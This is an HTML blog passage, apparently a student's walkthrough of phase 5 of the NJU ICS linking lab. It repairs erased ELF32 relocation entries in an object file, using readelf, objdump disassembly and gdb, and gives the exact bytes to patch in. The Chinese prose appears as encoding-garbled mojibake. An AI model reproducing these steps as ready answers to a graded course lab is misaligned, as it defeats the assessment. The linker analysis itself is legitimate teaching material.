class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -r phase5.o</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x7f8</span> contains <span class="number">23</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">00000066</span>  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000075</span>  <span class="number">00000501</span> R_386_32          <span class="number">00000000</span>   .rodata</span><br><span class="line"><span class="number">00000086</span>  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">000000b</span>d  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000</span>cc  <span class="number">00000</span>d01 R_386_32          <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">000000f</span>9  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">00000107</span>  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000118</span>  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">00000138</span>  <span class="number">00001302</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">strlen</span></span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000162</span>  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">000001</span>c0  <span class="number">00001302</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">strlen</span></span><br><span class="line"><span class="number">000001e4</span>  <span class="number">00001101</span> R_386_32          <span class="number">00000080</span>   AycPNh</span><br><span class="line"><span class="number">000001</span>ea  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">00000246</span>  <span class="number">00001002</span> R_386_PC32        <span class="number">000000</span>ef   generate_code</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000256</span>  <span class="number">00000</span>c01 R_386_32          <span class="number">00000100</span>   tqdzfNje</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000268</span>  <span class="number">00001702</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">puts</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰7ä¸ªé‡å®šä½ä¿¡æ¯è¢«æŠ¹é™¤äº†</p><p>è´´ä¸€ä¸‹ç¬¦å·è¡¨ä¿¡æ¯ï¼Œåé¢è¦ç”¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -s phase5.o</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 25 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 FILE    LOCAL  DEFAULT  ABS phase5.c</span><br><span class="line">     2: 00000000     0 SECTION LOCAL  DEFAULT    1 .text</span><br><span class="line">     3: 00000000     0 SECTION LOCAL  DEFAULT    3 .data</span><br><span class="line">     4: 00000000     0 SECTION LOCAL  DEFAULT    5 .bss</span><br><span class="line">     5: 00000000     0 SECTION LOCAL  DEFAULT    6 .rodata</span><br><span class="line">     6: 00000000     0 SECTION LOCAL  DEFAULT    9 .note.GNU-stack</span><br><span class="line">     7: 00000000     0 SECTION LOCAL  DEFAULT   10 .eh_frame</span><br><span class="line">     8: 00000000     0 SECTION LOCAL  DEFAULT    8 .comment</span><br><span class="line">     9: 00000000   250 OBJECT  GLOBAL DEFAULT    3 ohMkhV</span><br><span class="line">    10: 00000000    93 FUNC    GLOBAL DEFAULT    1 OOtZxJJdNH</span><br><span class="line">    11: 000000fc     4 OBJECT  GLOBAL DEFAULT    3 phase_id</span><br><span class="line">    12: 00000100    10 OBJECT  GLOBAL DEFAULT    3 tqdzfNje</span><br><span class="line">    13: 00000020    52 OBJECT  GLOBAL DEFAULT    6 yAnKQn</span><br><span class="line">    14: 0000010c     4 OBJECT  GLOBAL DEFAULT    3 aQSEth</span><br><span class="line">    15: 0000005d   146 FUNC    GLOBAL DEFAULT    1 transform_code</span><br><span class="line">    16: 000000ef    60 FUNC    GLOBAL DEFAULT    1 generate_code</span><br><span class="line">    17: 00000080   128 OBJECT  GLOBAL DEFAULT    6 AycPNh</span><br><span class="line">    18: 0000012b   136 FUNC    GLOBAL DEFAULT    1 encode_1</span><br><span class="line">    19: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND strlen</span><br><span class="line">    20: 000001b3   135 FUNC    GLOBAL DEFAULT    1 encode_2</span><br><span class="line">    21: 00000110     8 OBJECT  GLOBAL DEFAULT    3 encoder</span><br><span class="line">    22: 0000023a    56 FUNC    GLOBAL DEFAULT    1 do_phase</span><br><span class="line">    23: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND puts</span><br><span class="line">    24: 00000118     4 OBJECT  GLOBAL DEFAULT    3 phase</span><br></pre></td></tr></table></figure><p>gdbè°ƒè¯•ä¸€ä¸ªä¸€ä¸ªæ”¹å§</p><p><img src="/2023/05/08/ics4-linklab/image-20230507200104767.png" alt="image-20230507200104767"></p><h4 id="generate-code"><a href="#generate-code" class="headerlink" title="generate_code"></a>generate_code</h4><p>ç¬¬ä¸€ä¸ªé”™è¯¯å‘ç”Ÿåœ¨generate_codeé‡Œ</p><p><img src="/2023/05/08/ics4-linklab/image-20230507200258182.png" alt="image-20230507200258182"></p><p>ç¡®å®æ²¡æœ‰åšé‡å®šä½</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">generate_code</span><span class="params">( <span class="type">int</span> cookie )</span> &#123;</span><br><span class="line">... = cookie;</span><br><span class="line"><span class="keyword">for</span>( i=<span class="number">0</span>; i&lt;...; i++ ) &#123;</span><br><span class="line">... = transform_code( ..., i );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»æ¡†æ¶é‡Œçœ‹å‡ºæ˜¯è°ƒç”¨äº†transform_codeå‡½æ•°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">000000</span>ef &lt;generate_code&gt;:</span><br><span class="line">  ef:    <span class="number">55</span>                   push   %ebp</span><br><span class="line">  f0:    <span class="number">89</span> e5                mov    %esp,%ebp</span><br><span class="line">  f2:    <span class="number">83</span> ec <span class="number">10</span>             sub    $<span class="number">0x10</span>,%esp</span><br><span class="line">  f5:    <span class="number">8b</span> <span class="number">45</span> <span class="number">08</span>             mov    <span class="number">0x8</span>(%ebp),%eax</span><br><span class="line">  f8:    a3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    %eax,<span class="number">0x0</span></span><br><span class="line">  fd:    c7 <span class="number">45</span> fc <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> movl   $<span class="number">0x0</span>,<span class="number">-0x4</span>(%ebp)</span><br><span class="line"> <span class="number">104</span>:    eb <span class="number">1</span>a                jmp    <span class="number">120</span> &lt;generate_code+<span class="number">0x31</span>&gt;</span><br><span class="line"> <span class="number">106</span>:    a1 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x0</span>,%eax</span><br><span class="line"> <span class="number">10b</span>:    ff <span class="number">75</span> fc             push   <span class="number">-0x4</span>(%ebp)</span><br><span class="line"> <span class="number">10</span>e:    <span class="number">50</span>                   push   %eax</span><br><span class="line"> <span class="number">10f</span>:    e8 fc ff ff ff       call   <span class="number">110</span> &lt;generate_code+<span class="number">0x21</span>&gt;</span><br><span class="line"> <span class="number">114</span>:    <span class="number">83</span> c4 <span class="number">08</span>             add    $<span class="number">0x8</span>,%esp</span><br><span class="line"> <span class="number">117</span>:    a3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    %eax,<span class="number">0x0</span></span><br><span class="line"> <span class="number">11</span>c:    <span class="number">83</span> <span class="number">45</span> fc <span class="number">01</span>          addl   $<span class="number">0x1</span>,<span class="number">-0x4</span>(%ebp)</span><br><span class="line"> <span class="number">120</span>:    <span class="number">8b</span> <span class="number">45</span> fc             mov    <span class="number">-0x4</span>(%ebp),%eax</span><br><span class="line"> <span class="number">123</span>:    <span class="number">83</span> f8 <span class="number">0</span>c             cmp    $<span class="number">0xc</span>,%eax</span><br><span class="line"> <span class="number">126</span>:    <span class="number">76</span> de                jbe    <span class="number">106</span> &lt;generate_code+<span class="number">0x17</span>&gt;</span><br><span class="line"> <span class="number">128</span>:    <span class="number">90</span>                   nop</span><br><span class="line"> <span class="number">129</span>:    c9                   leave  </span><br><span class="line"> <span class="number">12</span>a:    c3                   ret    </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">10f</span>:    e8 fc ff ff ff       call   <span class="number">110</span> &lt;generate_code+<span class="number">0x21</span>&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯æˆ‘ä»¬è¦é‡å®šä½å¾—åœ°æ–¹ï¼Œæ€ä¹ˆé‡å®šä½å¯ä»¥çœ‹   <a href="https://grxer.github.io/2023/04/28/static-link/">https://grxer.github.io/2023/04/28/static-link/</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> Elf32_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> Elf32_Word;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word    r_info;<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><p><strong>r_offset</strong>è¡¨ç¤ºè¦ä¿®æ­£çš„ä½ç½®ç¬¬ä¸€ä¸ªå­—èŠ‚ç›¸å¯¹äºè¿™ä¸ªæ®µçš„åç§»</p><p>r_info ä½8ä½è¡¨ç¤ºè¦é‡å®šä½ç±»å‹ï¼Œé«˜24ä½æ˜¯ç¬¦å·åœ¨ç¬¦å·è¡¨é‡Œçš„ä¸‹æ ‡</p><p>r_offsetä¸º110ï¼Œç›¸å¯¹é‡å®šä½ç±»å‹ 02 ï¼Œç¬¦å·è¡¨é‡Œçš„ä¸‹æ ‡ 15å³f</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">10</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">02</span> <span class="number">0f</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p><img src="/2023/05/08/ics4-linklab/image-20230507202240463.png" alt="image-20230507202240463"></p><p>okäº†</p><p><img src="/2023/05/08/ics4-linklab/image-20230507202423749.png" alt="image-20230507202423749"></p><h4 id="transform-code"><a href="#transform-code" class="headerlink" title="transform_code"></a>transform_code</h4><p>æ¥ä¸‹æ¥é”™è¯¯å‘ç”Ÿåœ¨transform_codeé‡Œ</p><p><img src="/2023/05/08/ics4-linklab/image-20230507202626683.png" alt="image-20230507202626683"></p><p><img src="/2023/05/08/ics4-linklab/image-20230507202705410.png" alt="image-20230507202705410"></p><p>å¾ˆç†Ÿæ‚‰çš„æŒ‡ä»¤8b 04 85ï¼Œæˆ‘ä»¬ä¸Šä¸€ä¸ªswitchåˆšç¢°åˆ°è¿‡â€¦</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">transform_code</span><span class="params">( <span class="type">int</span> code, <span class="type">int</span> mode )</span> &#123;</span><br><span class="line"><span class="keyword">switch</span> ( yAnKQn[mode] ... )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>: ......</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>: ......</span><br><span class="line">......</span><br><span class="line"><span class="keyword">default</span>: ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000005</span>d &lt;transform_code&gt;:</span><br><span class="line">  <span class="number">5</span>d:    <span class="number">55</span>                   push   %ebp</span><br><span class="line">  <span class="number">5</span>e:    <span class="number">89</span> e5                mov    %esp,%ebp</span><br><span class="line">  <span class="number">60</span>:    <span class="number">8b</span> <span class="number">45</span> <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%eax</span><br><span class="line">  <span class="number">63</span>:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  <span class="number">6</span>a:    <span class="number">83</span> e0 <span class="number">07</span>             and    $<span class="number">0x7</span>,%eax</span><br><span class="line">  <span class="number">6</span>d:    <span class="number">83</span> f8 <span class="number">07</span>             cmp    $<span class="number">0x7</span>,%eax</span><br><span class="line">  <span class="number">70</span>:    <span class="number">77</span> <span class="number">74</span>                ja     e6 &lt;transform_code+<span class="number">0x89</span>&gt;</span><br><span class="line">  <span class="number">72</span>:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">54</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x54</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  <span class="number">79</span>:    ff e0                jmp    *%eax</span><br><span class="line">  <span class="number">7b</span>:    f7 <span class="number">55</span> <span class="number">08</span>             notl   <span class="number">0x8</span>(%ebp)</span><br><span class="line">  <span class="number">7</span>e:    eb <span class="number">6</span>a                jmp    ea &lt;transform_code+<span class="number">0x8d</span>&gt;</span><br><span class="line">  <span class="number">80</span>:    <span class="number">8b</span> <span class="number">45</span> <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%eax</span><br><span class="line">  <span class="number">83</span>:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  <span class="number">8</span>a:    <span class="number">83</span> e0 <span class="number">03</span>             and    $<span class="number">0x3</span>,%eax</span><br><span class="line">  <span class="number">8</span>d:    <span class="number">89</span> c1                mov    %eax,%ecx</span><br><span class="line">  <span class="number">8f</span>:    d3 <span class="number">7</span>d <span class="number">08</span>             sarl   %cl,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  <span class="number">92</span>:    eb <span class="number">56</span>                jmp    ea &lt;transform_code+<span class="number">0x8d</span>&gt;</span><br><span class="line">  <span class="number">94</span>:    <span class="number">8b</span> <span class="number">45</span> <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%eax</span><br><span class="line">  <span class="number">97</span>:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  <span class="number">9</span>e:    f7 d0                not    %eax</span><br><span class="line">  a0:    <span class="number">21</span> <span class="number">45</span> <span class="number">08</span>             and    %eax,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  a3:    eb <span class="number">45</span>                jmp    ea &lt;transform_code+<span class="number">0x8d</span>&gt;</span><br><span class="line">  a5:    <span class="number">8b</span> <span class="number">45</span> <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%eax</span><br><span class="line">  a8:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  af:    c1 e0 <span class="number">08</span>             shl    $<span class="number">0x8</span>,%eax</span><br><span class="line">  b2:    <span class="number">09</span> <span class="number">45</span> <span class="number">08</span>             or     %eax,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  b5:    eb <span class="number">33</span>                jmp    ea &lt;transform_code+<span class="number">0x8d</span>&gt;</span><br><span class="line">  b7:    <span class="number">8b</span> <span class="number">45</span> <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%eax</span><br><span class="line">  ba:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  c1:    <span class="number">31</span> <span class="number">45</span> <span class="number">08</span>             xor    %eax,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  c4:    eb <span class="number">24</span>                jmp    ea &lt;transform_code+<span class="number">0x8d</span>&gt;</span><br><span class="line">  c6:    <span class="number">8b</span> <span class="number">45</span> <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%eax</span><br><span class="line">  c9:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  d0:    f7 d0                not    %eax</span><br><span class="line">  d2:    <span class="number">09</span> <span class="number">45</span> <span class="number">08</span>             or     %eax,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  d5:    eb <span class="number">13</span>                jmp    ea &lt;transform_code+<span class="number">0x8d</span>&gt;</span><br><span class="line">  d7:    <span class="number">8b</span> <span class="number">45</span> <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%eax</span><br><span class="line">  da:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br><span class="line">  e1:    <span class="number">01</span> <span class="number">45</span> <span class="number">08</span>             add    %eax,<span class="number">0x8</span>(%ebp)</span><br><span class="line">  e4:    eb <span class="number">04</span>                jmp    ea &lt;transform_code+<span class="number">0x8d</span>&gt;</span><br><span class="line">  e6:    f7 <span class="number">5</span>d <span class="number">08</span>             negl   <span class="number">0x8</span>(%ebp)</span><br><span class="line">  e9:    <span class="number">90</span>                   nop</span><br><span class="line">  ea:    <span class="number">8b</span> <span class="number">45</span> <span class="number">08</span>             mov    <span class="number">0x8</span>(%ebp),%eax</span><br><span class="line">  ed:    <span class="number">5</span>d                   pop    %ebp</span><br><span class="line">  ee:    c3                   ret    </span><br></pre></td></tr></table></figure><p>5d+58(åè¿›åˆ¶)&#x3D;0x97</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">97</span>:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåº”è¯¥æ˜¯.rodataæ•°æ®yAnKQnçš„é‡å®šä½äº†</p><p>r_offset 97+3&#x3D;9a ç±»å‹ 01 yAnKQnç¬¦å·ä¸‹æ ‡13å³d</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">9</span>A <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">0</span>D <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p><img src="/2023/05/08/ics4-linklab/image-20230507205421832.png" alt="image-20230507205421832"></p><p>ä¸‹ä¸€ä¸ªé”™è¯¯</p><p><img src="/2023/05/08/ics4-linklab/image-20230507205323580.png" alt="image-20230507205323580"></p><p><img src="/2023/05/08/ics4-linklab/image-20230507205344052.png" alt="image-20230507205344052"></p><p>è¿˜æ˜¯ä¸€æ ·çš„</p><p>0x5d+75(åè¿›åˆ¶)&#x3D;0xA8</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">a8:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br></pre></td></tr></table></figure><p>offset &#x3D;a8+3&#x3D;AB å…¶ä½™å’Œä¸Šé¢ä¸€æ ·</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AB <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">0</span>D <span class="number">00</span> <span class="number">00</span> </span><br></pre></td></tr></table></figure><p><img src="/2023/05/08/ics4-linklab/image-20230507205815532.png" alt="image-20230507205815532"></p><p>åé¢åˆæ”¹äº†ä¸€ä¸ªä¸€æ ·çš„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">da:    <span class="number">8b</span> <span class="number">04</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x0</span>(,%eax,<span class="number">4</span>),%eax</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DD <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">0</span>D <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p><img src="/2023/05/08/ics4-linklab/image-20230507210127236.png" alt="image-20230507210127236"></p><h4 id="do-phase"><a href="#do-phase" class="headerlink" title="do_phase"></a>do_phase</h4><p><img src="/2023/05/08/ics4-linklab/image-20230507210234694.png" alt="image-20230507210234694"></p><p><img src="/2023/05/08/ics4-linklab/image-20230507210250054.png" alt="image-20230507210250054"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">do_phase</span><span class="params">()</span> &#123;</span><br><span class="line">generate_code(...);</span><br><span class="line">......; <span class="comment">// Call one encoder here</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, ...);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000023</span>a &lt;do_phase&gt;:</span><br><span class="line"> <span class="number">23</span>a:    <span class="number">55</span>                   push   %ebp</span><br><span class="line"> <span class="number">23b</span>:    <span class="number">89</span> e5                mov    %esp,%ebp</span><br><span class="line"> <span class="number">23</span>d:    <span class="number">83</span> ec <span class="number">08</span>             sub    $<span class="number">0x8</span>,%esp</span><br><span class="line"> <span class="number">240</span>:    <span class="number">68</span> f3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       push   $<span class="number">0xf3</span></span><br><span class="line"> <span class="number">245</span>:    e8 fc ff ff ff       call   <span class="number">246</span> &lt;do_phase+<span class="number">0xc</span>&gt;<span class="comment">//call çš„æ˜¯generate_code</span></span><br><span class="line"> <span class="number">24</span>a:    <span class="number">83</span> c4 <span class="number">04</span>             add    $<span class="number">0x4</span>,%esp</span><br><span class="line"> <span class="number">24</span>d:    a1 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x4</span>,%eax</span><br><span class="line"> <span class="number">252</span>:    <span class="number">83</span> ec <span class="number">0</span>c             sub    $<span class="number">0xc</span>,%esp</span><br><span class="line"> <span class="number">255</span>:    <span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       push   $<span class="number">0x0</span></span><br><span class="line"> <span class="number">25</span>a:    ff d0                call   *%eax</span><br><span class="line"> <span class="number">25</span>c:    <span class="number">83</span> c4 <span class="number">10</span>             add    $<span class="number">0x10</span>,%esp</span><br><span class="line"> <span class="number">25f</span>:    <span class="number">83</span> ec <span class="number">0</span>c             sub    $<span class="number">0xc</span>,%esp</span><br><span class="line"> <span class="number">262</span>:    <span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       push   $<span class="number">0x0</span></span><br><span class="line"> <span class="number">267</span>:    e8 fc ff ff ff       call   <span class="number">268</span> &lt;do_phase+<span class="number">0x2e</span>&gt;<span class="comment">//æ¡†æ¶é‡Œè™½ç„¶æ˜¯printfï¼Œè¢«ç¼–è¯‘å™¨ä¼˜åŒ–ä¸ºäº†puts</span></span><br><span class="line"> <span class="number">26</span>c:    <span class="number">83</span> c4 <span class="number">10</span>             add    $<span class="number">0x10</span>,%esp</span><br><span class="line"> <span class="number">26f</span>:    <span class="number">90</span>                   nop</span><br><span class="line"> <span class="number">270</span>:    c9                   leave  </span><br><span class="line"> <span class="number">271</span>:    c3                   ret    </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">24</span>d:    a1 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x4</span>,%eax</span><br></pre></td></tr></table></figure><p>ç»“åˆæ¡†æ¶å’Œcall   *%eaxï¼Œè¿™é‡Œåº”è¯¥é‡å®šä½ä¸€ä¸ªencoderå‡½æ•°ï¼Œ</p><p>offset 24d+1&#x3D;24e,ä»–çš„åˆå§‹åç§»ä¸º4ä¼°è®¡æ˜¯ç»å¯¹åœ°å€é‡å®šä½ 01 encoderç¬¦å·ä¸‹æ ‡21å³0x15</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span>E <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">15</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p>ä¸‹ä¸€ä¸ªé”™è¯¯</p><p><img src="/2023/05/08/ics4-linklab/image-20230507212648240.png" alt="image-20230507212648240"></p><p>pushäº†0åšå‚æ•°ï¼Œputså¿…æŠ¥é”™ï¼Œè¿™é‡Œå°±æ˜¯æˆ‘ä»¬çš„ç©ºæŒ‡é’ˆæŒ‡å‘çš„åœ°æ–¹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">262</span>:    <span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       push   $<span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>é‚£pushä»€ä¹ˆå‘¢</p><p>å¯ä»¥çœ‹åˆ°encoderå‡½æ•°å‚æ•°ï¼Œæ˜¯tqdzfNje</p><p><img src="/2023/05/08/ics4-linklab/image-20230507213134515.png" alt="image-20230507213134515"></p><p>è¾“å‡ºçš„æƒ³å¿…å°±æ˜¯encodeåçš„å†…å®¹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">63</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p><img src="/2023/05/08/ics4-linklab/image-20230507214005609.png" alt="image-20230507214005609"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">UuUHH[[!?</span><br></pre></td></tr></table></figure><p>æœ‰è¾“å‡ºä½†ç»“æœä¸å¤ªå¯¹ï¼Œtmd</p><p><img src="/2023/05/08/ics4-linklab/image-20230507220450148.png" alt="image-20230507220450148"></p><p>çœ‹æ¥ä¸€ä¸‹encoderè°ƒç”¨çš„æ˜¯encode_2</p><p><img src="/2023/05/08/ics4-linklab/image-20230507220550289.png" alt="image-20230507220550289"></p><p>å‘ç°ä»–æ˜¯ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„ï¼Œç¡®å®ä»–åœ¨ç¬¦å·è¡¨é‡Œçš„sizeæ˜¾ç¤ºçš„ä¹Ÿæ˜¯8</p><p>é‚£è‚¯å®šencode_1æ˜¯æ­£ç¡®ç­”æ¡ˆäº†,ç”±äºæ˜¯<code>call   *%eax</code>callçš„eaxé‡Œçš„å†…å®¹æ‰€ä»¥ä¸èƒ½ç›´æ¥æŠŠ encode_1çš„å‡½æ•°ç¬¦å·å†™åˆ°é‡å®šä½ä¿¡æ¯é‡Œ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Relocation section <span class="string">&#x27;.rel.data&#x27;</span> at offset <span class="number">0x8b0</span> contains <span class="number">4</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">000000f</span>c  <span class="number">00000501</span> R_386_32          <span class="number">00000000</span>   .rodata</span><br><span class="line"><span class="number">00000110</span>  <span class="number">00001201</span> R_386_32          <span class="number">0000012b</span>   encode_1</span><br><span class="line"><span class="number">00000114</span>  <span class="number">00001401</span> R_386_32          <span class="number">000001b</span>3   encode_2</span><br><span class="line"><span class="number">00000118</span>  <span class="number">00001601</span> R_386_32          <span class="number">0000023</span>a   